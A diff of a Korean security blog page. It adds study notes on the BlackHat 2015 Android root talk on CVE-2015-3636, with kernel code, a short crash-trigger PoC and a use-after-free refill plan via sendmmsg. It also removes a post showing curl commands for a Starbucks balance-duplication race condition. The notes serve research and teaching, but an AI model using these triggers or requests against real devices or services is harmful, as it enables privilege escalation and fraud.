@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="DEFCON 2015, Offensive and Defensive Android Reverse Engineering 에서. Github.com 의 rednaga/training 에 가보면 있음. Alcatel One Touch Pop Icon A564C 우선 전략을 &hellip;">
+  <meta name="description" content="BlackHat 2015 에 발표된 Own your Android! Yet Another Universal Root, Wen Xu, Yubin Fu. 를 정리해본다. BlackHat 발표 영상 Bug analysis CVE-2015-3636: Wen Yu 와 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +65,312 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/09/02/own-your-android-yet-another-universal-root/">Own Your Android! Yet Another Universal Root</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-09-02T09:26:22+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>9:26 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>BlackHat 2015 에 발표된 Own your Android! Yet Another Universal Root, Wen Xu, Yubin Fu. 를 정리해본다.</p>
+
+<p><a href="https://www.youtube.com/watch?v=HVP1c7Ct1nM">BlackHat 발표 영상</a></p>
+
+<h4>Bug analysis</h4>
+
+<ul>
+<li>CVE-2015-3636: Wen Yu 와 wushi (of Keen Team) 이 <a href="https://github.com/kernelslacker/trinity">Trinity fuzzer</a> 로 찾음.</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Paging fault # virtual address 00200200.
+</span><span class='line'>PC is at ping_unhash+0x50/0xd4</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ICMP Ping 을 할 때 지나가는 코드인 것 같은데.</p>
+
+<p><code>socket(AF_INET, SOCK_DGRAM, IP_PROTO_ICMP)</code> 를 할 경우에 다음과 같은 코드를 지나간다고 한다.</p>
+
+<figure class='code'><figcaption><span>net/ipv4/af_inet.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">inet_dgram_connect</span><span class="p">(</span><span class="k">struct</span> <span class="n">socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">uaddr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">addr_len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">addr_len</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">uaddr</span><span class="o">-&gt;</span><span class="n">sa_family</span><span class="p">))</span>
+</span><span class='line'>        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">uaddr</span><span class="o">-&gt;</span><span class="n">sa_family</span> <span class="o">==</span> <span class="n">AF_UNSPEC</span><span class="p">)</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_prot</span><span class="o">-&gt;</span><span class="n">disconnect</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">...</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Socket 의 어드레스 패밀리가 unspecified 일 경우, <code>disconnect()</code> 를 호출하는데, PING (ICMP) 의 경우 불리는 함수는 <code>udp_disconnect()</code>.</p>
+
+<figure class='code'><figcaption><span>udp_disconnect()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">udp_disconnect</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">inet_sock</span> <span class="o">*</span><span class="n">inet</span> <span class="o">=</span> <span class="n">inet_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_state</span> <span class="o">=</span> <span class="n">TCP_CLOSE</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">...</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_userlocks</span> <span class="o">&amp;</span> <span class="n">SOCK_BINDPORT_LOCK</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_proto</span><span class="o">-&gt;</span><span class="n">unhash</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">inet</span><span class="o">-&gt;</span><span class="n">inet_sport</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="n">sk_dst_reset</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="n">EXPORT_SYMBOL</span><span class="p">(</span><span class="n">udp_disconnect</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>여기서 <code>sk_prot-&gt;unhash(sk)</code> 를 호출하는데, 그러면 <code>ping_unhash()</code> 가 호출된다.</p>
+
+<p><code>sk_hashed(sk)</code> 로 socket 이 hashed 되어있는지 확인하고, TRUE 라면 sk_nulls_node 를 지운다.</p>
+
+<figure class='code'><figcaption><span>ping_unhash()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">ping_unhash</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">inet_sock</span> <span class="o">*</span><span class="n">isk</span> <span class="o">=</span> <span class="n">inet_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">pr_debug</span><span class="p">(</span><span class="s">&quot;ping_unhash(isk=%p,isk-&gt;num=%u)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">isk</span><span class="p">,</span> <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_num</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">sk_hashed</span><span class="p">(</span><span class="n">sk</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">write_lock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ping_table</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">hlist_nulls_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_nulls_node</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">sock_put</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">isk</span><span class="o">-&gt;</span><span class="n">inet_sport</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>        <span class="n">sock_prot_inuse_add</span><span class="p">(</span><span class="n">sock_net</span><span class="p">(</span><span class="n">sk</span><span class="p">),</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_prot</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">write_unlock_bh</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ping_table</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>hlist_nulls_del(&amp;sk-&gt;sk_nulls_node)</code> 를 하면, <code>__hlist_nulls_del(n)</code> 으로 지우고, <code>n-&gt;pprev = LIST_POISON2</code> 가 된다.</p>
+
+<figure class='code'><figcaption><span>hlist_nulls_del(struct hlist_nulls_node *n)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">__hlist_nulls_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">n</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">next</span> <span class="o">=</span> <span class="n">n</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">hlist_nulls_ndoe</span> <span class="o">**</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">n</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="p">;</span>
+</span><span class='line'>    <span class="o">*</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">is_a_nulls</span><span class="p">(</span><span class="n">next</span><span class="p">))</span>
+</span><span class='line'>        <span class="n">next</span><span class="o">-&gt;</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">pprev</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">hlist_nulls_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">hlist_nulls_node</span> <span class="o">*</span><span class="n">n</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">__hlist_nulls_del</span><span class="p">(</span><span class="n">n</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">n</span><span class="o">-&gt;</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">LIST_POISON2</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>n-&gt;pprev = LIST_POISON2</code> 라는 코드가 있는데, <code>LIST_POISON2</code> 의 값은 Android 32/64 bit kernel 에서 모두 <code>0x200200</code> 이다.</p>
+
+<p>저자에 따르면,</p>
+
+<ul>
+<li>connect 를 두번째 부를때, <code>ping_unhash()</code> 가 또 불리고, 리스트에서 지워지기는 했지만, <code>sk_hashed(sk)</code> 체크는 통과해서 다시 <code>hlist_nulls_del(&amp;sk-&gt;sk_nulls_node)</code> 가 또 불린다.</li>
+<li><code>n-&gt;pprev</code> 는 전번의 콜 <code>n-&gt;pprev = LIST_POISON2</code> 에 의해서 LIST_POISON2 인 상황인데, <code>**pprev = n-&gt;pprev;</code> -> <code>*pprev = next;</code> 가 돌아가면 <code>0x200200</code> 에 write 가 들어간다.</li>
+<li>0x200200 이 page mapping 이 안되어 있으면, kernel 에서 fault 가 난다.</li>
+</ul>
+
+
+<p>여기서 local DoS 가 발생하는데, 저자에 따르면 local DoS 는 전체 그림의 일부분이라는 것.</p>
+
+<p><code>ping_unhash()</code> 에서, <code>sk_hashed()</code> 체크 이후에, 리스트에서 지우고, <code>sock_put()</code> 을 부르는데, 저자들은 이게 수상쩍다고 한다.
+<code>sock_put()</code> 를 보면, <code>sk_refcnt</code> 를 줄이고, 0 이면 sk_free() 를 통해서 free 가 들어간다.</p>
+
+<figure class='code'><figcaption><span>sock_put()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">sock_put</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_dec_and_test</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_refcnt</span><span class="p">))</span>
+</span><span class='line'>        <span class="n">sk_free</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>일단 0x200200 을 mapping 해놔서 paging fault 를 막아낸 다음에,</li>
+<li><code>sock_put()</code> 을 두번 불러서 <code>sk_free()</code> 가 불려지도록 하고,</li>
+<li>그 다음에 거기를 어떻게든 re-fill 해놓고</li>
+<li>close() 콜로 close 관련 function ptr 을 호출하는</li>
+<li>Use-after-refill-after-free 상황을 만들어내는게 저자의 의도같다.</li>
+</ul>
+
+
+<p>Use-after-free 를 설명하면,</p>
+
+<ul>
+<li>일단 free 를 시켜야한다. allocator 가 잡고 있는 메모리에 뭘 쓰는건 어렵다.</li>
+<li>근데 비정상적으로 free 시키는 것이 좋다. 정상적으로 free 시키면 진짜 없는 녀석이 되기 때문에, 나중에 사용이 불가능하다.</li>
+<li>비정상적으로 free 시키고, 그 자리에 어떻게든 다른 object 를 allocate 시켜야한다.</li>
+<li>다른 object 를 allocate 시킨 다음에, 그 내용을 어느정도 조작할 수 있어야한다.</li>
+<li>원래 object 의 function ptr 가 위치했던 자리를 조작해낼 수 있으면 대박이다.</li>
+<li>조작해낸 다음에 원래 object 의 close() 를 부르면 close function ptr 가 호출되고&hellip; 이러면 대박이다.</li>
+</ul>
+
+
+<p>저자들은 여기서 refilling 이 핵심이라고 이야기한다.</p>
+
+<h4>PoC</h4>
+
+<p>CVE-2015-3636 의 PoC.</p>
+
+<figure class='code'><figcaption><span>PoC of CVE-2015-3636</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">IPPROTO_ICMP</span><span class="p">);</span>
+</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="n">AF_INET</span> <span class="p">};</span>
+</span><span class='line'><span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">_addr</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span> <span class="p">};</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_addr</span><span class="p">));</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_addr</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이렇게 하면 crash 가 날것 같은데.</p>
+
+<ul>
+<li>처음에는 AF_INET 으로 해야한다고 한다.</li>
+<li>Android 디바이스에서만 동작한다고 한다. <code>/proc/sys/net/ipv4/ping_group_range</code> 에 PING socket 을 만들 수 있는 그룹이 정의되어 있다고. PC 리눅스와 Android 와는 이 부분이 다르다고.</li>
+</ul>
+
+
+<p>QEMU 에 android kernel 을 올려서, 저 코드를 실행을 해봐야겠다.</p>
+
+<h4>Exploitation</h4>
+
+<p>Kernel 에서 SLAB/SLUB allocator 를 사용한다고 하는데.</p>
+
+<p>고려해야할 점은.</p>
+
+<ul>
+<li>Isolated Heap. PartitionAlloc. 이런 메커니즘들.</li>
+<li>Privileged Access Never.</li>
+<li>Linux kernel 의 multi-threading support.</li>
+</ul>
+
+
+<p>둘간의 차이는 여기에 <a href="http://events.linuxfoundation.org/images/stories/pdf/klf2012_kim.pdf">SLAB vs SLUB</a></p>
+
+<p>이 쯤에서 저자들이 이 버그를 어떻게 찾아냈는지 추측해본다.</p>
+
+<ul>
+<li>Trinity 로 android kernel call fuzzing 을 심하게 걸었는데</li>
+<li>0x200200 에 write 가 들어가면서 paging fault 가 나는 것을 보고 조사를 해보니,</li>
+<li>PING socket 에 대한 connect 가 두번 불려서 일어난 것이라는 걸 알아내고</li>
+<li>아니, 시스템 콜 이중호출로 paging fault 가 일어나는 걸 보니, 수상한걸&hellip;</li>
+<li>아니, 이중호출로 object 가 free() 가 되네.</li>
+<li>이거 use-after-free 아녀?</li>
+<li>free() 한 다음에 refill 이 가능할까?</li>
+</ul>
+
+
+<p>뭐 이렇게 흘러간것 같다.</p>
+
+<ul>
+<li>socket structure 를 삐꾸로 free() 하고,</li>
+<li>memory allocator 를 어찌어찌 이용해서, 그 자리에 뭔가 object 를 alloc 시켜서 refill 을 한 다음에,</li>
+<li>(socket 이 정상이라고 착각하고 있는 상황에서) socket close() 를 불러서, close_func_ptr 이 호출되게 만드는데,</li>
+<li>그 포인터는 exploit 을 향하고 있다.</li>
+</ul>
+
+
+<p>이 정도가 아닐까?</p>
+
+<h4>Refill</h4>
+
+<p>저자들은 refill 이 가장 어려웠다고 한다.</p>
+
+<ul>
+<li><code>sendmmsg()</code> 를 가지고 refill 을 한 모양.</li>
+<li><code>sendmmsg()</code> 수행중에 <code>kmalloc</code> 이 들어가서 파라메터로 넘겨준 데이터 패킷을 저장하기 위한 버퍼를 alloc 한다고.</li>
+<li>데이터패킷의 사이즈를 지정할 수 있는데, 512 로 해서, PING socket 과 같은 cache 에 alloc 되도록 한다.</li>
+</ul>
+
+
+<p>즉 흐름을 정리하면 <code>(512 bytes) PING SOCK</code> -> bug free -> <code>(512 bytes) FREE chunk</code> -> sendmmsg -> <code>(512 bytes) TRANSFER BUFFER</code> 가 되는 셈.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1935,59 +2241,6 @@
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/07/17/hacking-starbucks-for-unlimited-coffee/">Hacking Starbucks for Unlimited Coffee</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-07-17T20:15:05+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:15 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://sakurity.com/blog/2015/05/21/starbucks.html">Hacking Starbucks for unlimited coffee</a></p>
-
-<p>Sakurity 의 글 하나를 요약해본다.</p>
-
-<h4>race condition</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /step1?amount=1&from=wallet1&to=wallet2
-</span><span class='line'>POST /step2?confirm</span></code></pre></td></tr></table></div></figure>
-
-
-<p>로 two steps 로 되어있는데,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>curl starbucks/step1 -H Cookie: session=session1 --data amount=1&from=w1&to=w2
-</span><span class='line'>curl starbucks/step1 -H Cookie: session=session2 --data amount=1&from=w1&to=w2
-</span><span class='line'>
-</span><span class='line'>curl starbucks/step2confirm -H Cookie: session=session1 & curl starbucks/step2?confirm -H Cookie: session=session2</span></code></pre></td></tr></table></div></figure>
-
-
-<p>세션 2 개를 만들어서 대여섯번 시도하니, 돈이 복사가 되었다고 한다. 게임에 많이 나오는 돈복사 버그.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/3">&larr; Older</a>
@@ -2005,6 +2258,10 @@
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/">BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
       </li>
     
@@ -2018,10 +2275,6 @@
     
       <li class="post">
         <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
       </li>
     
   </ul>
